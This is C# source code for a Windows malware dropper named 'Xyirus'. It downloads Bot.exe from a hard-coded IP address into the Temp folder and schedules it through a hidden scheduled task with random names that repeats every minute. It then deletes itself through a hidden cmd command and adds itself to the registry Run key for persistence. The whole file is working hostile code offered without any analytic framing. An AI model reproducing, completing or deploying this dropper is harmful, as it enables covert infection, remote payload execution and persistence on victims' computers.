using System;
using System.Net;
using System.IO;
using System.Diagnostics;
using Microsoft.Win32;
using System.Windows.Forms;
using System.Reflection;

namespace Xyirus
{
    class Program
    {
        static void Main(string[] args)
        {
            Skacat("http://62.113.117.136/bin/Bot.exe", "Bot.exe");
            schedule(Environment.GetEnvironmentVariable("Temp") + "\\Bot.exe");
            SelfDelete("5");
            autoRun();
        }

        public static void Skacat(string url, string filename)
        {
            filename = Environment.GetEnvironmentVariable("Temp") + "\\" + filename;
            using (var suka = new WebClient())
            {
                suka.DownloadFile(url, filename);
            }
        }

        public static void autoRun()
        {
            RegistryKey rsk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            rsk.SetValue("cmd", Application.ExecutablePath);
        }

        public static void schedule(string path)
        {
            var process = new Process();
            process.StartInfo = new ProcessStartInfo("cmd", "/C" + "schtasks /create /tn \\" + generateString() + "\\" + generateString() + " /tr " + path + " /st 00:00 /du 9999:59 /sc once /ri 1 /f");
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.Start();
        }

        public static String generateString()
        {
            string abc = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm";
            string result = "";
            Random rnd = new Random();
            int iner = rnd.Next(0, abc.Length);
            for (int i = 0; i < iner; i++)
                result += abc[rnd.Next(0, abc.Length)];


            return result;
        }
        public static void SelfDelete(string delay)
        {
            Process.Start(new ProcessStartInfo
            {
                Arguments = "/C choice /C Y /N /D Y /T " + delay + " & Del \"" + new FileInfo(new Uri(Assembly.GetExecutingAssembly().CodeBase).LocalPath).Name + "\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                FileName = "cmd.exe"
            });
        }

    }
}
